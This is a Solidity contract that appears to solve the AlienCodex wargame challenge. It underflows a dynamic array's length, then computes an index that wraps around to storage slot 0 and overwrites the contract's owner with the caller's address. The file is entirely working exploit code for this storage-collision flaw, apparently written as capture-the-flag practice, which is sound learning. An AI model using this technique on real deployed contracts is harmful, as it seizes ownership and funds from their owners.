// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint256 i, bytes32 _content) external;
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
}

contract Solve {
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}